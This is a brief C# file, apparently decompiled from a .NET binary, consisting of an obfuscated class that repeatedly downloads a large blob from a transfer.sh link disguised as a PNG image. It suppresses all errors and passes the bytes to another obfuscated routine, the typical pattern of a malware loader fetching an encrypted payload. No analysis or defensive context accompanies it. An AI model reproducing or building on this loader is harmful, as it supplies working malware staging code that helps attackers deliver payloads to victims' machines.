using System;
using System.IO;
using System.Net;

internal sealed class Class3
{
	private static byte[] smethod_0(string string_0)
	{
		while (true)
		{
			try
			{
				BinaryReader binaryReader = new BinaryReader(WebRequest.Create(string_0).GetResponse().GetResponseStream());
				try
				{
					return binaryReader.ReadBytes(50000000);
				}
				finally
				{
					((IDisposable)binaryReader).Dispose();
				}
			}
			catch
			{
			}
		}
	}

	internal static byte[] smethod_1()
	{
		return Class0.smethod_0(smethod_0("https://transfer.sh/get/90fotv/Uhhxonr_Ldhqhpvk.png")).ToArray();
	}
}
